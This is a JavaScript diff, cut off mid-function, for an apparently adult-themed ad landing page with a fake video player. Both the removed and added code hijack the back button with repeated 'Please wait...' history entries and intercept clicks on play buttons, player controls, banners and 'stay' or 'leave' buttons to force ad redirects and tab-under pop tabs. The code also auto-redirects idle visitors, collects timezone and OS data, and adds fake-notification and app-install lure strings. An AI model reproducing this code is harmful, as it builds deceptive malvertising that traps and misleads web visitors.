@@ -1,523 +1,962 @@
-/* common.js — FINAL v11 (Hybrid) — PATCHED:
-   - FAST/SLOW clone behavior:
-       * main_play / background => SLOW clone (loader)
-       * mini-controls/icons   => FAST clone (no loader)
-   - clone URL now carries __fast=1 only for FAST
-   - __skipPreview no longer forced for all clones
-   - reverse popstate filtered by state marker
-   - buildDirectUrlWithTracking now can pass-through all original params (safe merge)
-*/
-
 (() => {
   "use strict";
 
-  // ---------------------------
-  // Helpers
-  // ---------------------------
-  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
-  const err  = (...a) => safe(() => console.error(...a));
-
-  const replaceTo = (url) => {
-    try { window.location.replace(url); } catch { window.location.href = url; }
-  };
-
-  // --- Direct open (no about:blank) ---
-  const openTab = (url) => {
-    try {
-      const w = window.open(url, "_blank");
-      if (w) { try { w.opener = null; } catch {} }
-      return w || null;
-    } catch {
-      return null;
+  const localeModules = {
+    "src/landings/player/locale/en.json"(module, exports) {
+      module.exports = {
+        no: "No",
+        yes: "Yes",
+        install_app_and_continue_watching: "Install {app_name} and continue watching content in Safe mode",
+        notification: "(1) Notification",
+        our_app: "our app"
+      };
     }
   };
 
-  // ---------------------------
-  // URL + params (snapshot)
-  // ---------------------------
-  const curUrl = new URL(window.location.href);
-  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
-
-  const CLONE_PARAM = "__cl";
-  const isClone = getSP(CLONE_PARAM) === "1";
-
-  const IN = {
-    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
-    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
-    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
-    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
-    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
-    cid: getSP("cid"), geo: getSP("geo"),
-
-    // ExoClick conversions_tracking passthrough
-    external_id: getSP("external_id"),
-
-    // Optional passthroughs
-    creative_id: getSP("creative_id"),
-    ad_campaign_id: getSP("ad_campaign_id"),
-    cost: getSP("cost"),
+  let __localeCache;
+  const loadFallbackLocale = () => {
+    if (__localeCache) return __localeCache;
+    const module = { exports: {} };
+    localeModules[Object.keys(localeModules)[0]](module, module.exports);
+    __localeCache = module.exports;
+    return __localeCache;
   };
 
-  const qsFromObj = (obj) => {
+  const EVENTS_HISTORY_KEY = "events_history";
+
+  const getEventsHistory = () => {
+    try {
+      const raw = sessionStorage.getItem(EVENTS_HISTORY_KEY);
+      return raw ? JSON.parse(raw) : [];
+    } catch (error) {
+      if (error instanceof Error && window.syncMetric) {
+        window.syncMetric({
+          event: "error",
+          errorMessage: error.message,
+          errorType: "CUSTOM",
+          errorSubType: "EventsHistoryGet"
+        });
+      }
+      return [];
+    }
+  };
+
+  const saveEventsHistory = (history) => {
+    try {
+      sessionStorage.setItem(EVENTS_HISTORY_KEY, JSON.stringify(history));
+    } catch (error) {
+      if (error instanceof Error && window.syncMetric) {
+        window.syncMetric({
+          event: "error",
+          errorMessage: error.message,
+          errorType: "CUSTOM",
+          errorSubType: "EventsHistorySave"
+        });
+      }
+    }
+  };
+
+  const getLang = () => {
+    const fromQuery = new URLSearchParams(window.location.search).get("lang");
+    const browserLang = navigator.language.split("-")[0];
+    return fromQuery || browserLang || "en";
+  };
+
+  const templateHashesContext = () => window.templateHashes ? JSON.stringify(window.templateHashes) : null;
+
+  const pageUrl = new URL(window.location.href);
+  const IN = {
+    pz: pageUrl.searchParams.get("pz") ?? "",
+    tb: pageUrl.searchParams.get("tb") ?? "",
+    tb_reverse: pageUrl.searchParams.get("tb_reverse") ?? "",
+    ae: pageUrl.searchParams.get("ae") ?? "",
+    z: pageUrl.searchParams.get("z") ?? "",
+    var: pageUrl.searchParams.get("var") ?? "",
+    var_1: pageUrl.searchParams.get("var_1") ?? "",
+    var_2: pageUrl.searchParams.get("var_2") ?? "",
+    var_3: pageUrl.searchParams.get("var_3") ?? "",
+    b: pageUrl.searchParams.get("b") ?? "",
+    campaignid: pageUrl.searchParams.get("campaignid") ?? "",
+    abtest: pageUrl.searchParams.get("abtest") ?? "",
+    rhd: pageUrl.searchParams.get("rhd") ?? "1",
+    s: pageUrl.searchParams.get("s") ?? "",
+    ymid: pageUrl.searchParams.get("ymid") ?? "",
+    wua: pageUrl.searchParams.get("wua") ?? "",
+    use_full_list_or_browsers: pageUrl.searchParams.get("use_full_list_or_browsers") ?? "",
+    cid: pageUrl.searchParams.get("cid") ?? "",
+    geo: pageUrl.searchParams.get("geo") ?? ""
+  };
+
+  const JS_VERSION = "{%ssp_user_id_encoded%}";
+
+  const EVENT_NAMES = {
+    start: "start",
+    ageExit: "age_exit",
+    mainExit: "main_exit",
+    push: "push",
+    autoexit: "autoexit",
+    back: "back",
+    reverse: "reverse",
+    tabUnderClick: "tab_under_click",
+    error: "error",
+    unhandledRejection: "unhandled_rejection",
+    template_hash_ready: "template_hash_ready",
+    template_hashes_ready: "template_hashes_ready"
+  };
+
+  const nowUtcSql = (() => {
+    const d = new Date();
+    return `${d.getUTCFullYear()}-${String(d.getUTCMonth() + 1).padStart(2, "0")}-${String(d.getUTCDate()).padStart(2, "0")} ${String(d.getUTCHours()).padStart(2, "0")}:${String(d.getUTCMinutes()).padStart(2, "0")}:${String(d.getUTCSeconds()).padStart(2, "0")}.${String(d.getUTCMilliseconds() * 1000).padStart(6, "0")} +00:00`;
+  })();
+
+  const getAb2r = () => IN.abtest || (APP_CONFIG.abtest ? String(APP_CONFIG.abtest) : undefined);
+
+  const buildMetric = ({
+    event,
+    exitZoneId,
+    errorMessage,
+    errorSubType,
+    errorType,
+    skipHistory,
+    skipContext
+  }) => {
+    const ds = document.querySelector("html")?.dataset;
+    const landingName = ds?.landingName || "";
+    const buildVersion = ds?.version || "";
+    const env = ds?.env || "";
+    const host = window.location.host;
+    const mappedEvent = EVENT_NAMES[event] || event;
+    const language = getLang();
+
+    const nowTs = Date.now();
+    const history = getEventsHistory();
+    const prev = history[history.length - 1];
+    const delta = prev ? nowTs - prev.currentTs : 0;
+
+    if (!skipHistory) {
+      history.push({ currentTs: nowTs, eventName: mappedEvent, delta });
+      if (history.length >= 30) history.shift();
+      saveEventsHistory(history);
+    }
+
+    const payload = [{
+      app: "landings-constructor",
+      event: mappedEvent,
+      language,
+      landing_name: landingName,
+      build_version: buildVersion,
+      landing_domain: host,
+      landing_url: window.location.href,
+      exit_zone_id: exitZoneId ? Number(exitZoneId) : undefined,
+      template_hash: window.templateHash ?? "",
+      request_var: IN.var_3,
+      source_zone_id: Number.isNaN(Number(IN.var_2)) ? null : Number(IN.var_2),
+      sub_id: IN.var_1,
+      landing_load_date_time: nowUtcSql,
+      error_message: errorMessage ?? "",
+      ab2r: getAb2r(),
+      event_history: JSON.stringify({ event_history: JSON.parse(JSON.stringify(getEventsHistory())) }) ?? null,
+      context: skipContext ? undefined : JSON.stringify({ template_hashes: JSON.parse(templateHashesContext() ?? "{}") }),
+      error_sub_type: errorSubType,
+      error_type: errorType,
+      env,
+      js_version: JS_VERSION
+    }];
+
+    return {
+      eventData: payload,
+      isAnalyticEnabled: APP_CONFIG.isAnalyticEnabled ?? true
+    };
+  };
+
+  const getOsVersion = async () => {
+    const nav = navigator;
+    if (!nav.userAgentData) return "";
+    try {
+      const values = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
+      return values.platformVersion;
+    } catch (error) {
+      if (error instanceof Error && window.syncMetric) {
+        window.syncMetric({
+          event: "error",
+          errorMessage: error.message,
+          errorType: "CUSTOM",
+          errorSubType: "FetchPlatformVersion"
+        });
+      }
+      return "";
+    }
+  };
+
+  const getTimezone = () => {
+    if (typeof Intl !== "undefined" && typeof Intl.DateTimeFormat === "function") {
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      if (tz) return tz;
+    }
+    return "";
+  };
+
+  const getTimezoneOffset = () => new Date().getTimezoneOffset();
+
+  const objectToSearchParams = (obj) => {
     const qs = new URLSearchParams();
-    Object.entries(obj || {}).forEach(([k, v]) => {
-      if (v != null && String(v) !== "") qs.set(k, String(v));
+    Object.keys(obj).forEach((key) => {
+      if (obj[key]) qs.set(key, obj[key]);
     });
     return qs;
   };
 
-  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
-  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
-
-  const getOsVersion = async () => {
-    try {
-      const nav = navigator;
-      if (!nav.userAgentData?.getHighEntropyValues) return "";
-      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
-      return v?.platformVersion || "";
-    } catch { return ""; }
-  };
-  let osVersionCached = "";
-  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));
-
-  const buildCmeta = () => {
-    try {
-      const html = document.documentElement;
-      const payload = {
-        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
-        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
-        templateHash: window.templateHash || "",
-      };
-      return btoa(JSON.stringify(payload));
-    } catch { return ""; }
-  };
-
-  // ---------------------------
-  // Config Normalizer
-  // ---------------------------
-  const normalizeConfig = (appCfg) => {
-    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
-    const cfg = { domain: appCfg.domain };
-    const ensure = (name) => (cfg[name] ||= {});
-
-    Object.entries(appCfg).forEach(([k, v]) => {
-      if (v == null || v === "" || k === "domain") return;
-
-      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
-      if (m) {
-        const [, name, tab, field] = m;
-        const ex = ensure(name);
-        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = v;
-        return;
-      }
-
-      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
-      if (m) { ensure(m[1])[m[2]] = v; return; }
-
-      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
-      if (m) {
-        const [, name, field] = m;
-        const ex = ensure(name);
-        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
-        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = v;
+  const applyPassParamToParams = ({ passParamToParams, searchParams, windowUrl }) => {
+    passParamToParams.forEach((config) => {
+      const { from, to, joinWith } = config;
+      const value = Array.isArray(from)
+        ? from.map((item) => windowUrl.searchParams.get(item) ?? "").filter(Boolean).join(joinWith ?? "")
+        : (windowUrl.searchParams.get(from) ?? "");
+      if (value) {
+        to.forEach((target) => {
+          searchParams.set(target, value);
+        });
       }
     });
-
-    return cfg;
+    return searchParams;
   };
 
-  // ---------------------------
-  // URL Builders
-  // ---------------------------
-  const buildExitQSFast = ({ zoneId }) => {
-    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
-    const base = {
-      ymid: IN.var_1 || IN.var || "",
-      var: IN.var_2 || IN.z || "",
-      var_3: IN.var_3 || "",
+  const runtimeSearchParams = {};
+  if (typeof window !== "undefined") {
+    window.app = Object.assign(window.app ?? {}, {
+      setUrlSearchParam: (key, value) => {
+        runtimeSearchParams[key] = String(value);
+      }
+    });
+  }
 
-      b: IN.b || "",
-      campaignid: IN.campaignid || "",
-      click_id: IN.s || "",
-      rhd: IN.rhd || "1",
+  const truthyKeys = (obj) => Object.keys(obj).filter((k) => Boolean(obj[k]));
 
-      os_version: osVersionCached || "",
-      btz: getTimezoneName(),
-      bto: String(getTimezoneOffset()),
+  const BLOCKED_PASSTHROUGH_KEYS = new Set([
+    "creative_id",
+    "__poster",
+    "campid",
+    "lang",
+    "city",
+    "hidden"
+  ]);
 
-      cmeta: buildCmeta(),
-      pz: IN.pz || "",
-      tb: IN.tb || "",
-      tb_reverse: IN.tb_reverse || "",
-      ae: IN.ae || "",
-      ab2r,
+  const buildExitSearchParams = async ({ zone, passParamToParams }) => {
+    const timezone = getTimezone();
+    const offset = getTimezoneOffset();
 
-      // tracking passthrough
-      external_id: IN.external_id || "",
-      creative_id: IN.creative_id || "",
-      ad_campaign_id: IN.ad_campaign_id || "",
-      cost: IN.cost || "",
+    const dataVer = document.querySelector("html")?.getAttribute("data-version") || "";
+    const landingName = document.querySelector("html")?.getAttribute("data-landing-name") || "";
+    const templateHash = window.templateHash ?? "";
+
+    const cmeta = btoa(JSON.stringify({
+      dataVer,
+      landingName,
+      templateHash
+    }));
+
+    const baseAnalytics = {
+      pz: IN.pz,
+      tb: IN.tb,
+      tb_reverse: IN.tb_reverse,
+      ae: IN.ae,
+      ab2r: IN.abtest || String(APP_CONFIG.abtest || "")
     };
 
-    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
-    return qsFromObj(base);
-  };
+    let defaults = {
+      ymid: IN.var_1 ?? IN.var,
+      var: IN.var_2 ?? IN.z,
+      var_3: IN.var_3,
+      b: IN.b,
+      campaignid: IN.campaignid,
+      click_id: IN.s,
+      rhd: IN.rhd,
+      os_version: await getOsVersion(),
+      btz: timezone.toString(),
+      bto: offset.toString(),
+      cmeta
+    };
 
-  const generateAfuUrlFast = (zoneId, domain) => {
-    const host = String(domain || "").trim();
-    if (!host) return "";
-    const base = host.startsWith("http") ? host : `https://${host}`;
-    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
-    url.search = buildExitQSFast({ zoneId }).toString();
-    return url.toString();
-  };
+    if (zone) defaults.zoneid = zone;
 
-  // ---------------------------
-  // Direct URL builder (tabUnderClick_url / any ex.url)
-  // - inject tracking params
-  // - pass-through original landing params if missing (safe merge)
-  // ---------------------------
-  const buildDirectUrlWithTracking = (baseUrl) => {
-    try {
-      const u = new URL(String(baseUrl), window.location.href);
+    Object.entries(baseAnalytics).forEach(([k, v]) => {
+      if (v) defaults[k] = v;
+    });
 
-      // 1) pass-through everything from landing (only if missing on target)
-      for (const [k, v] of curUrl.searchParams.entries()) {
-        if (!u.searchParams.has(k) && v != null && String(v) !== "") u.searchParams.set(k, v);
+    const customSearchParams =
+      typeof APP_CONFIG?.customSearchParams === "object" && APP_CONFIG.customSearchParams !== null
+        ? APP_CONFIG.customSearchParams
+        : {};
+
+    const merged = {
+      ...Object.fromEntries(Object.entries(defaults).filter(([, v]) => Boolean(v))),
+      ...customSearchParams,
+      ...runtimeSearchParams
+    };
+
+    const lockedKeys = new Set([...truthyKeys(customSearchParams), ...truthyKeys(runtimeSearchParams)]);
+    const currentParams = new URL(window.location.href).searchParams;
+
+    for (const key of Object.keys(merged)) {
+      if (lockedKeys.has(key)) continue;
+      const value = currentParams.get(key);
+      if (value && !BLOCKED_PASSTHROUGH_KEYS.has(key)) {
+        merged[key] = value;
       }
-
-      // 2) enforce key tracking fields (priority)
-      const external_id = IN.external_id || "";
-      const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
-      const creative_id = IN.creative_id || "";
-      const cost = IN.cost || IN.b || "";
-
-      if (cost) u.searchParams.set("cost", cost);
-      if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");
-
-      if (external_id) u.searchParams.set("external_id", external_id);
-      if (creative_id) u.searchParams.set("creative_id", creative_id);
-      if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);
-
-      return u.toString();
-    } catch {
-      return String(baseUrl || "");
     }
+
+    // добираем только отсутствующие ключи, кроме заблокированных
+    for (const [key, value] of currentParams.entries()) {
+      if (!value) continue;
+      if (BLOCKED_PASSTHROUGH_KEYS.has(key)) continue;
+      if (key in merged) continue;
+      merged[key] = value;
+    }
+
+    if (zone) merged.zoneid = zone;
+
+    const qs = objectToSearchParams(merged);
+    return passParamToParams
+      ? applyPassParamToParams({
+          passParamToParams,
+          searchParams: qs,
+          windowUrl: new URL(window.location.href)
+        })
+      : qs;
   };
 
-  // ---------------------------
-  // Back & Exits
-  // ---------------------------
   const pushBackStates = (url, count) => {
     try {
-      const n = Math.max(0, parseInt(count, 10) || 0);
-      const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) window.history.pushState(null, "Please wait...", url);
-      window.history.pushState(null, document.title, originalUrl);
-    } catch (e) { err("Back pushState error:", e); }
+      for (let i = 0; i < count; i += 1) {
+        window.history.pushState(null, "Please wait...", url);
+      }
+      const original = window.location.href;
+      window.history.pushState(null, document.title, original);
+      console.log(`Back initializated ${count} times with ${url}`);
+    } catch (error) {
+      if (error instanceof Error && window.syncMetric) {
+        window.syncMetric({
+          event: "error",
+          errorMessage: error.message,
+          errorType: "CUSTOM",
+          errorSubType: "PushStateToHistory"
+        });
+      }
+    }
   };
 
-  const getDefaultBackHtmlUrl = () => {
+  const initBack = async (cfg) => {
+    const back = cfg?.back;
+    if (!back) return;
+
+    const { currentTab, pageUrl } = back;
+    if (!currentTab) return;
+
+    const count = back.count ?? 10;
     const { origin, pathname } = window.location;
-    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
-    if (dir.endsWith("/")) dir = dir.slice(0, -1);
-    if (!dir) return `${origin}/back.html`;
-    return `${origin}${dir}/back.html`;
-  };
 
-  const initBackFast = (cfg) => {
-    const b = cfg?.back?.currentTab;
-    if (!b) return;
-    const count = cfg.back?.count ?? 10;
-    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
-    const page = new URL(pageUrl, window.location.href);
-
-    const qs = buildExitQSFast({ zoneId: b.zoneId });
-
-    if (b.url) qs.set("url", String(b.url));
-    else {
-      qs.set("z", String(b.zoneId));
-      qs.set("domain", String(b.domain || cfg.domain || ""));
-    }
-
-    page.search = qs.toString();
-    pushBackStates(page.toString(), count);
-  };
-
-  const resolveUrlFast = (ex, cfg) => {
-    if (!ex) return "";
-    if (ex.url) return buildDirectUrlWithTracking(ex.url);
-    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
-    return "";
-  };
-
-  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
-    const ex = cfg?.[name]?.currentTab;
-    if (!ex) return;
-    const url = resolveUrlFast(ex, cfg);
-    if (!url) return;
-
-    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
-
-    if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
-    else { replaceTo(url); }
-  };
-
-  const runExitDualTabsFast = (cfg, name, withBack = true) => {
-    const ex = cfg?.[name];
-    if (!ex) return;
-
-    const ct = ex.currentTab;
-    const nt = ex.newTab;
-
-    const ctUrl = resolveUrlFast(ct, cfg);
-    const ntUrl = resolveUrlFast(nt, cfg);
-
-    safe(() => {
-      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
-      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
-    });
-
-    if (withBack) initBackFast(cfg);
-    if (ntUrl) openTab(ntUrl);
-    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
-  };
-
-  const run = (cfg, name) => {
-    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true)
-                                  : runExitCurrentTabFast(cfg, "mainExit", true);
-    }
-    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
-    return runExitCurrentTabFast(cfg, name, true);
-  };
-
-  // ---------------------------
-  // Reverse, Autoexit, Ready
-  // ---------------------------
-  const initReverse = (cfg) => {
-    if (!cfg?.reverse?.currentTab) return;
-    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", (e) => {
-      if (e?.state && e.state.__rev === 1) runExitCurrentTabFast(cfg, "reverse", false);
-    });
-  };
-
-  const initAutoexit = (cfg) => {
-    if (!cfg?.autoexit?.currentTab) return;
-    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
-    let armed = false;
-
-    const trigger = () => {
-      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
-    };
-
-    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
-
-    const cancel = () => {
-      clearTimeout(timer);
-      document.removeEventListener("visibilitychange", trigger);
-    };
-
-    document.addEventListener("visibilitychange", trigger);
-    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
-  };
-
-  const isPlayerReady = () => {
-    const btn = document.querySelector(".xh-main-play-trigger");
-    return !!(btn && btn.classList.contains("ready"));
-  };
-
-  // ---------------------------
-  // Micro Handoff (clone + tabUnderClick redirect)
-  // ---------------------------
-  const MICRO_DONE_KEY = "__micro_done";
-
-  const buildCloneUrl = (fast) => {
-    const u = new URL(window.location.href);
-    u.searchParams.set(CLONE_PARAM, "1");
-
-    // FAST vs SLOW for your frameLoader
-    if (fast) u.searchParams.set("__fast", "1");
-    else u.searchParams.delete("__fast");
-
-    // (optional compat marker, but ONLY for fast now)
-    if (fast) u.searchParams.set("__skipPreview", "1");
-    else u.searchParams.delete("__skipPreview");
-
-    // sync video OR fake image
-    const video = document.querySelector("video");
-    const imgFrame = document.querySelector(".xh-frame");
-
-    if (video) {
-      u.searchParams.set("t", video.currentTime || 0);
-      const poster = video.getAttribute("poster");
-      if (poster) u.searchParams.set("__poster", poster);
-    } else if (imgFrame) {
-      u.searchParams.set("t", 0);
-      if (imgFrame.src) u.searchParams.set("__poster", imgFrame.src);
-    }
-
-    return u.toString();
-  };
-
-  const runMicroHandoff = (cfg, fast) => {
-    if (isClone) return;
-
-    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
-    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
-
-    const cloneUrl = buildCloneUrl(!!fast);
-    safe(() => window.syncMetric?.({ event: fast ? "micro_open_clone_fast" : "micro_open_clone_slow" }));
-    openTab(cloneUrl);
-
-    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
-    const monetUrl = resolveUrlFast(ex, cfg);
-    if (monetUrl) {
-      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
-      initBackFast(cfg);
-      setTimeout(() => replaceTo(monetUrl), 40);
+    let target = `${origin}${pathname}`;
+    if (pageUrl) {
+      target = pageUrl;
     } else {
-      run(cfg, "mainExit");
+      target = target.includes("index.html") ? target.split("/index.html")[0] : target;
+      target = target.includes("back.html") ? target.split("/back.html")[0] : target;
+      if (target.endsWith("/")) target = target.substring(0, target.length - 1);
+      target += "/back.html";
     }
+
+    const targetUrl = new URL(target);
+    const qs = await buildExitSearchParams({ zone: currentTab.zoneId });
+
+    let analyticsPayload = null;
+    let analyticsEnabled = false;
+
+    if (currentTab.url) {
+      qs.set("url", currentTab.url);
+    } else if (currentTab.domain && currentTab.zoneId) {
+      qs.set("z", currentTab.zoneId);
+      qs.set("domain", currentTab.domain);
+    }
+
+    if (window.syncMetric) {
+      const metric = buildMetric({
+        event: "back",
+        exitZoneId: currentTab.zoneId,
+        skipHistory: true,
+        skipContext: true
+      });
+      analyticsPayload = metric.eventData;
+      analyticsEnabled = metric.isAnalyticEnabled;
+    }
+
+    if (analyticsEnabled && analyticsPayload) {
+      qs.set("mData", btoa(JSON.stringify(analyticsPayload)));
+    }
+
+    const finalBackUrl = decodeURIComponent(`${targetUrl.toString()}?${qs.toString()}`);
+    pushBackStates(finalBackUrl, count);
   };
 
-  // ---------------------------
-  // Click Map
-  // ---------------------------
-  const initClickMap = (cfg) => {
-    const fired = { mainExit: false, back: false };
-    const microTargets = new Set([
-      "timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"
-    ]);
-
-    // helper: decide fast vs slow per click
-    const consumeFastFlag = (fallback) => {
-      const v = (window.__FAST_CLICK__ === true);
-      // reset immediately so next click doesn't inherit accidentally
-      window.__FAST_CLICK__ = false;
-      return v || !!fallback;
-    };
-
-    document.addEventListener("click", (e) => {
-      const zone = e.target?.closest?.("[data-target]");
-      const t = zone?.getAttribute("data-target") || "";
-      const modal = document.getElementById("xh_exit_modal");
-      const banner = document.getElementById("xh_banner");
-
-      // 0) PLAY FLOW:
-      // ORIGINAL: main_play -> micro handoff (clone + tabUnder)
-      // CLONE:    main_play -> mainExit (dual)
-      if (t === "main_play") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-
-        if (isClone) {
-          if (fired.mainExit) return;
-          fired.mainExit = true;
-          run(cfg, "mainExit");
-          return;
-        }
-
-        // main_play => SLOW
-        runMicroHandoff(cfg, false);
-        return;
-      }
-
-      // 1) BANNER: IMAGE -> MAIN EXIT
-      if (t === "banner_main") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "mainExit");
-        return;
-      }
-
-      // 2) BANNER: CLOSE -> MICRO HANDOFF (FAST by default)
-      if (t === "banner_close") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (banner) banner.style.display = "none";
-        runMicroHandoff(cfg, true);
-        return;
-      }
-
-      // 3) BACK UI BUTTON -> SHOW MODAL
-      if (t === "back_button") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (modal) {
-          modal.style.display = "flex";
-          modal.setAttribute("aria-hidden", "false");
-          fired.back = true;
-        }
-        return;
-      }
-
-      // 4) MODAL: STAY -> MICRO HANDOFF (SLOW or FAST based on last flag; fallback FAST=false)
-      if (t === "modal_stay") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
-        // modal stay обычно хотят "быстро уйти" — но оставлю SLOW=false (ты можешь поменять на true)
-        runMicroHandoff(cfg, false);
-        return;
-      }
-
-      // 5) MODAL: LEAVE -> AGE EXIT (dual)
-      if (t === "modal_leave") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
-        run(cfg, "ageExit");
-        return;
-      }
-
-      // 6) CLONE -> MAIN EXIT (any click)
-      if (isClone) {
-        if (fired.mainExit) return;
-        fired.mainExit = true;
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "mainExit");
-        return;
-      }
-
-      // 7) MICRO CONTROLS -> MICRO HANDOFF (FAST)
-      if (microTargets.has(t)) {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        const fast = consumeFastFlag(true); // always fast for microTargets
-        runMicroHandoff(cfg, fast);
-        return;
-      }
-
-      // 8) MAIN EXIT (all others)
-      if (fired.mainExit) return;
-      fired.mainExit = true;
-      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-      run(cfg, "mainExit");
-    }, true);
+  const generateAfuUrl = async (zoneId, domain, passParamToParams) => {
+    const host = domain.includes("http") ? domain : `https://${domain}`;
+    const url = new URL(`${host}/afu.php`);
+    const qs = await buildExitSearchParams({ zone: zoneId.toString(), passParamToParams });
+    const finalUrl = decodeURIComponent(`${url.toString()}?${qs.toString()}`);
+    console.log("URL generated:", finalUrl);
+    return finalUrl;
   };
 
-  // ---------------------------
-  // Boot
-  // ---------------------------
-  const boot = () => {
-    if (typeof window.APP_CONFIG === "undefined") {
-      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
+  const replaceTo = ({ url }) => {
+    window.location.replace(url);
+  };
+
+  const reportMissingExit = (config, name) => {
+    console.error(`${name || "Some exit"} was supposed to work, but some data about this type of exit was missed`, config);
+  };
+
+  const runCurrentTabExit = async (cfg, name, withBack = true) => {
+    const currentTab = cfg[name].currentTab;
+    if (!currentTab) {
+      reportMissingExit(currentTab, name);
       return;
     }
 
-    const cfg = normalizeConfig(window.APP_CONFIG);
-    if (!cfg) return;
+    let url;
+    if (currentTab.zoneId && currentTab.domain) {
+      window.syncMetric?.({ event: name, exitZoneId: currentTab.zoneId });
+      url = await generateAfuUrl(currentTab.zoneId, currentTab.domain);
+      if (withBack) await initBack(cfg);
+      replaceTo({ url });
+      return;
+    }
 
-    window.LANDING_EXITS = {
-      cfg,
-      run: (name) => run(cfg, name),
-      initBack: () => initBackFast(cfg),
-      microHandoff: (fast) => runMicroHandoff(cfg, fast),
-      isPlayerReady,
-    };
+    if (currentTab.url) {
+      window.syncMetric?.({ event: name, exitZoneId: currentTab.url });
+      url = currentTab.url;
+      if (withBack) await initBack(cfg);
+      replaceTo({ url });
+      return;
+    }
 
-    initClickMap(cfg);
-    initAutoexit(cfg);
-    initReverse(cfg);
+    reportMissingExit(currentTab, name);
   };
 
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
-  else boot();
+  const runDualExit = async (cfg, name) => {
+    const exit = cfg[name];
+    if (!exit) {
+      reportMissingExit(exit, name);
+      return;
+    }
+
+    const { currentTab, newTab } = exit;
+
+    let currentTabUrl;
+    if (currentTab) {
+      if (currentTab.zoneId && currentTab.domain) {
+        currentTabUrl = await generateAfuUrl(currentTab.zoneId, currentTab.domain);
+        window.syncMetric?.({ event: name, exitZoneId: currentTab.zoneId });
+      } else if (currentTab.url) {
+        currentTabUrl = currentTab.url;
+      } else {
+        reportMissingExit(exit, name);
+      }
+    }
+
+    let newTabUrl;
+    if (newTab) {
+      if (newTab.zoneId && newTab.domain) {
+        newTabUrl = await generateAfuUrl(newTab.zoneId, newTab.domain);
+        window.syncMetric?.({ event: name, exitZoneId: newTab.zoneId });
+      } else if (newTab.url) {
+        newTabUrl = newTab.url;
+      } else {
+        reportMissingExit(exit, name);
+      }
+    }
+
+    await initBack(cfg);
+
